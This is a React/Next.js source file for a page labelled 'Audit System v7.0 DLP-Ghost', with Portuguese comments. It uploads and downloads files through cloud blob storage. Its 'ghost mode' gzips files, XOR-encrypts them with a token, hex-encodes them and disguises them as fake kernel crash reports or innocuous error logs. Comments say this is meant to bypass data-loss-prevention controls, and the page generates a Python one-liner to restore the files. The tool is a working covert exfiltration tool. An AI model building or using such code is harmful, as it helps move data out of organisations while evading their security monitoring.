'use client';

import { useState, useRef, useCallback } from 'react';

interface BlobFile {
  url: string;
  pathname: string;
  size: number;
  uploadedAt: string;
}

export default function AuditPage() {
  const inputFileRef = useRef<HTMLInputElement>(null);
  const [loading, setLoading] = useState(false);
  const [token, setToken] = useState('');
  const [files, setFiles] = useState<BlobFile[]>([]);
  const [status, setStatus] = useState({ msg: '', type: '' }); // 'success' | 'error' | 'info'

  // Estado de Drag & Drop
  const [isDragging, setIsDragging] = useState(false);

  // Estados de Auditoria (Stealth v7.0)
  const [stealthMode, setStealthMode] = useState(false);
  const [useCompression, setUseCompression] = useState(true);

  // Estado para Preview
  const [previewContent, setPreviewContent] = useState<string | null>(null);
  const [previewTitle, setPreviewTitle] = useState('');

  // NOVO: Estado para exibir o comando de descriptografia após download
  const [decoderCmd, setDecoderCmd] = useState<string | null>(null);

  const showStatus = (msg: string, type: string) => {
    setStatus({ msg, type });
    setTimeout(() => setStatus({ msg: '', type: '' }), 4000);
  };

  const fetchFiles = async () => {
    if (!token) return;
    try {
      const res = await fetch('/api/files', { headers: { 'x-audit-token': token } });
      if (res.ok) {
        setFiles(await res.json());
      }
    } catch (error) {
      console.error(error);
    }
  };

  // --- Função 1: Compressão Gzip (Nativa do Navegador) ---
  const compressFile = async (file: File): Promise<Uint8Array> => {
    const stream = file.stream().pipeThrough(new CompressionStream('gzip'));
    return new Response(stream).arrayBuffer().then(buffer => new Uint8Array(buffer));
  };

  // --- Função 2: Converter Buffer (Binário) para Base64 ---
  const bufferToBase64 = (buffer: Uint8Array): string => {
    let binary = '';
    const len = buffer.byteLength;
    for (let i = 0; i < len; i++) {
      binary += String.fromCharCode(buffer[i]);
    }
    return btoa(binary);
  };

  // --- Função 3: Converter Arquivo Normal para Base64 (Fallback) ---
  const fileToBase64 = (file: File) => new Promise<string>((resolve, reject) => {
    const reader = new FileReader();
    reader.readAsDataURL(file);
    reader.onload = () => resolve(reader.result as string);
    reader.onerror = error => reject(error);
  });

  // --- Função 4: Criptografia XOR Dinâmica (v7.0) ---
  const xorEncrypt = (text: string, key: string) => {
    let result = "";
    for (let i = 0; i < text.length; i++) {
      result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result; // Retorna string binária (não Base64)
  };

  // --- Função 5: Converter String para Hexadecimal (v7.0) ---
  const stringToHex = (str: string) => {
    let hex = '';
    for (let i = 0; i < str.length; i++) {
      hex += str.charCodeAt(i).toString(16).padStart(2, '0');
    }
    return hex;
  };

  // Processo de Upload (Atualizado para v7.0)
  const handleUploadProcess = async (file: File) => {
    if (!token) {
      showStatus('Insira o Token (Necessário para Criptografia).', 'error');
      return;
    }
    setLoading(true);

    const msg = stealthMode
      ? `Camuflando como Crash Report (v7.0)...`
      : 'Enviando arquivo modo padrão...';
    showStatus(msg, 'info');

    try {
      let response;

      if (stealthMode) {
        // >>> MODO STEALTH v7 (Crash Report Camouflage + Hex Dump) <<<

        let contentBase64 = '';

        if (useCompression) {
          const compressedBytes = await compressFile(file);
          contentBase64 = bufferToBase64(compressedBytes);
        } else {
          contentBase64 = await fileToBase64(file);
          if (contentBase64.includes(',')) contentBase64 = contentBase64.split(',')[1];
        }

        const hiddenPayload = `${file.name}::${contentBase64}`;
        const encryptedBinary = xorEncrypt(hiddenPayload, token);
        const memoryDump = stringToHex(encryptedBinary);

        const crashReport = {
          type: "system_crash",
          severity: "critical",
          timestamp: Date.now(),
          module: "kernel_panic_handler",
          memory_dump: memoryDump
        };

        const logId = Math.floor(Math.random() * 900000) + 100000;

        response = await fetch(`/api/upload?mode=stealth&log_id=${logId}`, {
          method: 'POST',
          headers: {
            'x-audit-token': token,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(crashReport)
        });

      } else {
        // >>> MODO PADRÃO <<<
        response = await fetch(`/api/upload?filename=${file.name}`, {
          method: 'POST',
          body: file,
          headers: { 'x-audit-token': token }
        });
      }

      if (!response.ok) {
        const err = await response.json();
        throw new Error(err.error || 'Falha');
      }

      showStatus('Sucesso! Arquivo salvo na nuvem.', 'success');
      if (inputFileRef.current) inputFileRef.current.value = "";
      await fetchFiles();
    } catch (e: any) {
      showStatus(`Erro: ${e.message}`, 'error');
    } finally {
      setLoading(false);
    }
  };

  // --- NOVO: Função de Download Stealth (Bypass DLP) ---
  const handleStealthDownload = async (file: BlobFile) => {
    if (!token) {
      showStatus('Token necessário para descriptografar.', 'error');
      return;
    }

    showStatus('Iniciando download seguro (Proxy)...', 'info');

    try {
      // 1. Solicita ao backend para baixar, criptografar e empacotar como LOG
      const res = await fetch(`/api/upload?url=${encodeURIComponent(file.url)}`, {
        method: 'GET', // Explicitando GET
        headers: { 'x-audit-token': token }
      });

      if (!res.ok) throw new Error('Falha no proxy de download');

      // 2. Recebe o Blob (que é um arquivo texto .log disfarçado)
      const blob = await res.blob();

      // 3. Força o download no navegador
      const downloadUrl = window.URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = downloadUrl;
      // Define nome inocente para passar no DLP
      link.setAttribute('download', `system_error_log_${Math.floor(Date.now() / 1000)}.log`);
      document.body.appendChild(link);
      link.click();
      link.remove();

      showStatus('Log baixado. Execute o comando para restaurar.', 'success');

      // 4. Gera o one-liner Python para o usuário rodar localmente
      const cmd = `python3 -c "import sys;key='${token}';c=open(sys.argv[1]).read().split('START\\n')[1].split('\\nMEMORY')[0].strip();b=bytes.fromhex(c);o=bytes([b[i]^ord(key[i%len(key)]) for i in range(len(b))]);open('RESTORED_${file.pathname}','wb').write(o);print('Restaurado com sucesso!')" system_error_*.log`;
      setDecoderCmd(cmd);

    } catch (e) {
      showStatus('Erro no download seguro.', 'error');
      console.error(e);
    }
  };

  // Handlers de Drag & Drop
  const onDragOver = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(true);
  }, []);

  const onDragLeave = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
  }, []);

  const onDrop = useCallback((e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      handleUploadProcess(e.dataTransfer.files[0]);
    }
  }, [token, stealthMode, useCompression]);

  // Função de Deletar
  const handleDelete = async (url: string) => {
    if (!confirm('Tem certeza que deseja apagar este arquivo da nuvem?')) return;
    try {
      const res = await fetch(`/api/upload?url=${url}`, {
        method: 'DELETE',
        headers: { 'x-audit-token': token }
      });
      if (res.ok) {
        showStatus('Arquivo deletado.', 'success');
        setFiles(files.filter(f => f.url !== url));
      }
    } catch (e) {
      showStatus('Erro ao deletar.', 'error');
    }
  };

  // Função de Preview
  const handlePreview = async (file: BlobFile) => {
    if (!file.pathname.match(/\.(txt|csv|log|json|md|py|js|ts|tsx|java|c|cpp|sql|sh|xml|yaml|yml|ini|env)$/i)) {
      window.open(file.url, '_blank');
      return;
    }

    try {
      const res = await fetch(file.url);
      const text = await res.text();
      setPreviewTitle(file.pathname);
      setPreviewContent(text);
    } catch (e) {
      showStatus('Não foi possível ler o arquivo.', 'error');
    }
  };

  return (
    <main className="min-h-screen bg-gray-950 text-gray-300 font-sans p-6">
      <div className="max-w-4xl mx-auto">
        <header className="flex flex-col md:flex-row justify-between items-center mb-6 border-b border-gray-800 pb-4 gap-4">
          <h1 className="text-2xl font-bold text-red-500">Audit System <span className="text-xs bg-red-900 text-red-300 px-2 py-0.5 rounded">v7.0 DLP-Ghost</span></h1>
          <input
            type="password"
            value={token}
            onChange={(e) => setToken(e.target.value)}
            placeholder="Token (Chave Mestra)"
            className="bg-gray-900 border border-gray-700 text-white px-3 py-1 rounded text-sm w-48 focus:border-red-500 outline-none transition-all"
          />
        </header>

        {/* Status Toast */}
        {status.msg && (
          <div className={`fixed top-4 right-4 px-6 py-3 rounded shadow-xl text-white font-bold animate-bounce z-50 ${status.type === 'error' ? 'bg-red-600' : status.type === 'success' ? 'bg-green-600' : 'bg-blue-600'
            }`}>
            {status.msg}
          </div>
        )}

        {/* --- PAINEL DE INSTRUÇÕES DE DECODER (Aparece após Download Stealth) --- */}
        {decoderCmd && (
          <div className="mb-6 bg-gray-900 border border-yellow-600/50 p-4 rounded-lg relative animate-pulse-once shadow-lg shadow-yellow-900/10">
            <button onClick={() => setDecoderCmd(null)} className="absolute top-2 right-2 text-gray-500 hover:text-white text-xl leading-none">&times;</button>
            <h3 className="text-yellow-500 font-bold mb-2 flex items-center gap-2">
              ⚠️ Arquivo baixado como Log Camuflado (.log)
            </h3>
            <p className="text-sm text-gray-400 mb-3">
              O arquivo foi baixado em formato hexadecimal para passar pelo DLP. Para restaurar o original (ex: .py), execute este comando no terminal da sua máquina:
            </p>
            <div
              className="bg-black p-3 rounded border border-gray-700 font-mono text-xs text-green-400 break-all select-all cursor-pointer hover:bg-gray-950 transition-colors"
              onClick={() => { navigator.clipboard.writeText(decoderCmd); showStatus('Comando copiado!', 'success'); }}
              title="Clique para copiar"
            >
              {decoderCmd}
            </div>
            <p className="text-[10px] text-gray-600 mt-2 text-center w-full uppercase tracking-wider">Clique no comando acima para copiar</p>
          </div>
        )}

        {/* --- PAINEL DE CONTROLE STEALTH --- */}
        <div className={`mb-6 p-4 rounded border flex flex-col gap-4 transition-colors
          ${stealthMode ? 'bg-red-900/10 border-red-600' : 'bg-gray-900 border-gray-700'}`}>

          <div className="flex items-center gap-3">
            <input
              id="stealth-mode"
              type="checkbox"
              checked={stealthMode}
              onChange={(e) => setStealthMode(e.target.checked)}
              className="w-5 h-5 text-red-600 bg-gray-700 border-gray-500 rounded cursor-pointer"
            />
            <label htmlFor="stealth-mode" className={`font-bold text-lg cursor-pointer ${stealthMode ? 'text-red-400' : 'text-white'}`}>
              {stealthMode ? '👻 MODO GHOST (Anti-DLP)' : '🔓 Modo Padrão'}
            </label>
          </div>

          {stealthMode && (
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pl-8 border-t border-gray-700/50 pt-4">
              <div className="flex items-center gap-2">
                <input
                  id="compression"
                  type="checkbox"
                  checked={useCompression}
                  onChange={(e) => setUseCompression(e.target.checked)}
                  className="w-4 h-4 text-blue-500 bg-gray-700 border-gray-500 rounded"
                />
                <label htmlFor="compression" className="text-sm cursor-pointer hover:text-white select-none">
                  Ativar Compressão Gzip (Recomendado)
                </label>
              </div>
              <div className="text-xs text-gray-500 italic">
                * Arquivo será enviado como um relatório de erro hexadecimal.
              </div>
            </div>
          )}
        </div>

        {/* Upload Area (Drag & Drop) */}
        <div
          onDragOver={onDragOver}
          onDragLeave={onDragLeave}
          onDrop={onDrop}
          className={`border-2 border-dashed rounded-xl p-10 text-center transition-all cursor-pointer mb-8 relative overflow-hidden
            ${isDragging ? 'border-red-500 bg-red-900/20 scale-[1.02]' : 'border-gray-700 hover:border-gray-500 bg-gray-900/30'}
            ${stealthMode && !isDragging ? 'border-red-800/50' : ''}`}
        >
          <input
            type="file"
            ref={inputFileRef}
            onChange={(e) => e.target.files && handleUploadProcess(e.target.files[0])}
            className="hidden"
            id="fileUpload"
          />
          <label htmlFor="fileUpload" className="cursor-pointer flex flex-col items-center relative z-10">
            <svg className={`w-12 h-12 mb-3 transition-colors ${stealthMode ? 'text-red-500' : 'text-gray-500'}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path></svg>
            <span className="text-lg font-medium text-gray-300">
              {loading ? 'Processando Camuflagem...' : 'Arraste arquivos ou clique para enviar'}
            </span>
            <span className="text-xs text-gray-500 mt-2">
              {stealthMode ? 'Modo Seguro Ativo: Arquivos serão mascarados.' : 'Upload direto sem ofuscação.'}
            </span>
          </label>
        </div>

        {/* Lista de Arquivos */}
        <div className="flex justify-between items-center mb-4">
          <h2 className="text-xl font-semibold text-gray-200">Arquivos na Nuvem</h2>
          <button onClick={fetchFiles} className="text-xs sm:text-sm bg-gray-800 hover:bg-gray-700 px-3 py-1.5 rounded border border-gray-700 transition-colors">
            ↻ Atualizar Lista
          </button>
        </div>

        <div className="space-y-3">
          {files.map((file) => (
            <div key={file.url} className="group flex items-center justify-between bg-gray-900 p-3 rounded-lg border border-gray-800 hover:border-red-900/50 transition-all">
              <div className="flex items-center gap-3 overflow-hidden">
                <div className={`w-10 h-10 rounded flex items-center justify-center font-bold text-[10px] shrink-0
                  ${file.pathname.endsWith('.csv') || file.pathname.endsWith('.xlsx') ? 'bg-green-900 text-green-200' :
                    file.pathname.endsWith('.pdf') ? 'bg-red-900 text-red-200' :
                      file.pathname.match(/\.(py|js|ts|java|c|cpp|sql)$/i) ? 'bg-yellow-900 text-yellow-200' :
                        'bg-blue-900 text-blue-200'}`}>
                  {file.pathname.split('.').pop()?.toUpperCase().substring(0, 4)}
                </div>

                <div className="flex flex-col overflow-hidden">
                  <span className="text-sm font-medium text-gray-200 truncate max-w-[150px] sm:max-w-md cursor-pointer hover:text-red-400 transition-colors" onClick={() => handlePreview(file)}>
                    {file.pathname}
                  </span>
                  <span className="text-[10px] text-gray-500">{(file.size / 1024).toFixed(1)} KB • {new Date(file.uploadedAt).toLocaleString()}</span>
                </div>
              </div>

              <div className="flex items-center gap-2 opacity-100 sm:opacity-40 group-hover:opacity-100 transition-opacity">
                {/* BOTÃO DE DOWNLOAD STEALTH (ESCUDO) */}
                <button
                  onClick={() => handleStealthDownload(file)}
                  className="p-2 hover:bg-yellow-900/30 rounded text-yellow-500 transition-colors"
                  title="Baixar Camuflado (Bypass DLP)"
                >
                  🛡️
                </button>
                <button
                  onClick={() => handlePreview(file)}
                  className="p-2 hover:bg-gray-700 rounded text-blue-400 transition-colors"
                  title="Visualizar Conteúdo"
                >
                  👁️
                </button>
                <button
                  onClick={() => { navigator.clipboard.writeText(file.url); showStatus('Link copiado!', 'success'); }}
                  className="p-2 hover:bg-gray-700 rounded text-gray-400 transition-colors"
                  title="Copiar Link"
                >
                  📋
                </button>
                <button
                  onClick={() => handleDelete(file.url)}
                  className="p-2 hover:bg-red-900/30 rounded text-red-400 transition-colors"
                  title="Deletar permanentemente"
                >
                  🗑️
                </button>
              </div>
            </div>
          ))}
          {files.length === 0 && <p className="text-gray-600 text-center py-8 border border-dashed border-gray-800 rounded">Nenhum arquivo encontrado. Use o Token para carregar a lista.</p>}
        </div>
      </div>

      {/* Modal de Preview */}
      {previewContent && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center p-4 z-50 backdrop-blur-sm">
          <div className="bg-gray-900 border border-gray-700 w-full max-w-3xl rounded-lg shadow-2xl flex flex-col max-h-[85vh]">
            <div className="flex justify-between items-center p-4 border-b border-gray-800 bg-gray-900 rounded-t-lg">
              <h3 className="font-bold text-red-400 truncate pr-4">{previewTitle}</h3>
              <button onClick={() => setPreviewContent(null)} className="text-gray-400 hover:text-white text-2xl leading-none">&times;</button>
            </div>
            <div className="p-0 overflow-auto bg-gray-950">
              <pre className="p-4 font-mono text-xs sm:text-sm text-gray-300 whitespace-pre-wrap break-all">
                {previewContent}
              </pre>
            </div>
            <div className="p-4 border-t border-gray-800 flex justify-end bg-gray-900 rounded-b-lg">
              <button onClick={() => setPreviewContent(null)} className="bg-gray-800 px-6 py-2 rounded text-sm hover:bg-gray-700 border border-gray-700 transition-colors">Fechar</button>
            </div>
          </div>
        </div>
      )}
    </main>
  );
}